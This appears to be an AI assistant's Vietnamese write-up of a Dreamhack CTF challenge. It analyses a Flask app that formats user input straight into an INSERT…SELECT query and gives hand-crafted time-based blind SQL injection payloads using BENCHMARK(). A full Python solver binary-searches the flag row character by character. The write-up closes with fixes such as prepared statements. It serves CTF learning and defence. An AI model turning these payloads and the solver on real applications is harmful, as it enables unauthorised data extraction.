Tuyệt—vì bạn muốn “wu” chi tiết, mình viết đầy đủ quy trình từ phân tích source → thiết kế payload → khắc phục các “bẫy” (NULL) → script cuối cùng.

# Tổng quan service

* Stack: Flask + PyMySQL, chạy MySQL kèm app. `run.sh` khởi động MySQL rồi chạy Flask.&#x20;
* DB khởi tạo:

  * DB `book_db`, user `user/passwd`.
  * Bảng `requests(id, book_title, author)`.
  * Seed sẵn một hàng đặc biệt: `('FLAG', 'DH{flag}')` (đây là flag thật).&#x20;
* Route `/` (POST) nhận `title`, `author` rồi ghép **thẳng** vào SQL bằng `str.format` (không escape/param). Câu chạy là một “INSERT … SELECT … WHERE NOT EXISTS …” nên **cả `title` và `author` đều injectable**:

  ```python
  cursor.execute(
    "INSERT INTO requests (book_title, author) "
    "select '{0}', '{1}' "
    "where not exists (SELECT 1 FROM requests WHERE book_title='{0}' AND author='{1}');"
    .format(title, author)
  )
  ```

  → **SQLi (string formatting)** + không có dữ liệu lộ ra (trang chỉ báo “Thank you!”/“Error”). Đây là tình huống classic **blind SQLi**.&#x20;

# Tư duy khai thác

## 1) Dò kênh thời gian (time-based)

* Ý tưởng chuẩn: chèn một **biểu thức có delay** khi điều kiện đúng, ví dụ `SLEEP(5)`; tuy nhiên trên instance thật `SLEEP()` **không tạo delay** trong bối cảnh chèn ban đầu (bạn đã test).
* Nhưng `BENCHMARK(5000000, MD5(1))` **có** tạo độ trễ (\~2s ở host bạn) ⇒ dùng nó làm kênh time-based.

## 2) Vị trí chèn an toàn

* Ta biến câu SQL thành:

  ```sql
  INSERT INTO requests (book_title, author)
  SELECT 'a', (SELECT IF(<điều_kiện>, BENCHMARK(...), 0) FROM ... LIMIT 1) -- <comment phần còn lại>
  ```

  Đưa delay vào **cột thứ 2** của SELECT để đảm bảo nó **luôn được evaluate** (không phụ thuộc `NOT EXISTS`).
  Nếu cần, có biến thể đưa delay vào `WHERE (SELECT IF(...))` cũng được; nhưng “cột 2” thường dễ ổn định hơn.

## 3) Tránh “bẫy NULL”

* Scalar-subquery trong MySQL trả **NULL** nếu không có dòng ⇒ `IF(NULL, ...)` coi là **FALSE** ⇒ **không delay** dù điều kiện logic đúng → khiến bạn tưởng là “sai”.
* Cách tránh:

  * Khi kiểm tra “có dòng hay không”: dùng `EXISTS(SELECT 1 FROM …)` để luôn trả boolean.
  * Khi rút ký tự: wrap bằng `SELECT author … LIMIT 1` để subquery chắc chắn trả **1 giá trị** nếu tồn tại; nếu không tồn tại → kiểm tra `>0` sẽ fail và bạn dừng.

# Các payload then chốt (dùng tay để debug)

1. Kênh timing chạy được?

   ```
   title = a', (SELECT IF(1=1,BENCHMARK(5000000,MD5(1)),0)) -- 
   author = x
   ```

   → phản hồi \~2s ⇒ OK.

2. Có bảng `requests`?

   ```
   title = a', (SELECT IF(EXISTS(SELECT 1 FROM information_schema.tables
                                 WHERE table_schema=DATABASE()
                                   AND table_name='requests'),
                         BENCHMARK(5000000,MD5(1)),0)) -- 
   author = x
   ```

   → delay ⇒ bảng tồn tại.

3. Có dòng `book_title='FLAG'`?

   ```
   title = a', (SELECT IF(EXISTS(SELECT 1 FROM requests WHERE book_title='FLAG'),
                         BENCHMARK(5000000,MD5(1)),0)) -- 
   author = x
   ```

   → delay ⇒ hàng flag tồn tại (đúng theo seed).&#x20;

4. Rút từng ký tự (ví dụ ký tự 1 có ASCII ≥ 68?):

   ```
   title = a', (SELECT IF(ASCII(SUBSTRING((SELECT author FROM requests
                                           WHERE book_title='FLAG' LIMIT 1),1,1))>=68,
                         BENCHMARK(5000000,MD5(1)),0)) -- 
   author = x
   ```

   → delay = TRUE, nhanh = FALSE.

# Solver (in ra **một lần** ở cuối)

Bạn nói script trước “in từng ký tự”. Dưới đây là bản “đệm” toàn bộ, **chỉ in flag ở cuối**, vẫn dùng BENCHMARK và có các sanity-check/EXISTS để ổn định:

```python
import requests, time

BASE = "http://host8.dreamhack.games:9847/"
TIMEOUT = 20
THRESH = 1.0  # ~2s ở server bạn -> 1.0 là ngưỡng phân biệt

def post(title, author="x"):
    t0 = time.time()
    r = requests.post(BASE, data={"title": title, "author": author}, timeout=TIMEOUT)
    return time.time() - t0

def delayed_if(cond_sql: str) -> bool:
    payload = "a', (SELECT IF(({cond}),BENCHMARK(5000000,MD5(1)),0)) -- ".format(cond=cond_sql)
    return post(payload) > THRESH

def exists_flag_row() -> bool:
    return delayed_if("EXISTS(SELECT 1 FROM requests WHERE book_title='FLAG')")

def char_at_pos(pos: int):
    # nếu ký tự rỗng/không tồn tại -> None
    if not delayed_if(f"ASCII(SUBSTRING((SELECT author FROM requests WHERE book_title='FLAG' LIMIT 1),{pos},1))>0"):
        return None
    lo, hi = 32, 126
    while lo < hi:
        mid = (lo + hi + 1)//2
        if delayed_if(f"ASCII(SUBSTRING((SELECT author FROM requests WHERE book_title='FLAG' LIMIT 1),{pos},1))>={mid}"):
            lo = mid
        else:
            hi = mid - 1
    return chr(lo)

def main():
    # sanity timing
    if not delayed_if("1=1") or delayed_if("1=0"):
        print("[!] Time channel unstable. Increase THRESH or BENCHMARK workload.")
        return

    if not exists_flag_row():
        print("[!] No row with book_title='FLAG'. DB seed may differ.")
        return

    flag = []
    for i in range(1, 128):
        ch = char_at_pos(i)
        if ch is None:
            break
        flag.append(ch)
        if ch == "}":
            break

    s = "".join(flag)
    print("[*] FLAG =", s)

if __name__ == "__main__":
    main()
```

> Ghi chú:
>
> * Nếu mạng bạn chập chờn, tăng workload: `BENCHMARK(9000000,MD5(1))` và nâng `THRESH` lên \~1.5–2.0.
> * Bạn có thể bỏ hẳn mọi `print` giữa chừng (như ở trên) để “ra một lần”.

# Những “gotcha” & cách khắc phục

* **NULL trong scalar-subquery**: Luôn `LIMIT 1` khi lấy giá trị cụ thể và dùng `EXISTS(...)` trước khi brute-force. Đây là lý do script đầu của bạn “trắng tinh”.
* **SLEEP() không delay**: Ở instance của Dreamhack, `SLEEP` có thể bị chặn/tối ưu/timeout; `BENCHMARK()` là lựa chọn bền hơn. Bạn đã xác nhận bằng test thủ công.
* **Độ trễ mạng làm nhiễu**: Chọn workload sao cho “đường biên” chênh lệch rõ ràng (ví dụ \~2–3s) và đặt `THRESH` thấp hơn một chút.

# Biến thể & mở rộng

* Nếu không seed `FLAG`, vẫn có thể:

  * Dò `information_schema` để liệt kê bảng/cột rồi tìm chuỗi chứa `'DH{'` bằng `INSTR(col,'DH{')>0`.
  * Hoặc rút `DATABASE()`, `USER()`, … để debug kênh.
* Dùng **ternary search** hay **bit-by-bit** cho ASCII (thường **binary search** 7 lần/char là tối ưu).

# Nguyên nhân gốc & phòng thủ

* **Nguyên nhân**: Ghép chuỗi query bằng `str.format` với dữ liệu người dùng (không tham số hoá/escape).&#x20;
* **Fix**:

  * Dùng **prepared statements**:

    ```python
    cursor.execute(
      "INSERT INTO requests (book_title, author) \
       SELECT %s, %s WHERE NOT EXISTS (SELECT 1 FROM requests WHERE book_title=%s AND author=%s)",
      (title, author, title, author)
    )
    ```
  * Hạn chế quyền DB của user (không GRANT rộng), tắt các hàm nặng (khó với MySQL), giới hạn `max_execution_time`, thêm WAF đơn giản với blacklist `'--'`, `'/*'`, `'('`… (chỉ giảm rủi ro, **không** thay thế được prepared statements).
  * Validate đầu vào (độ dài, charset).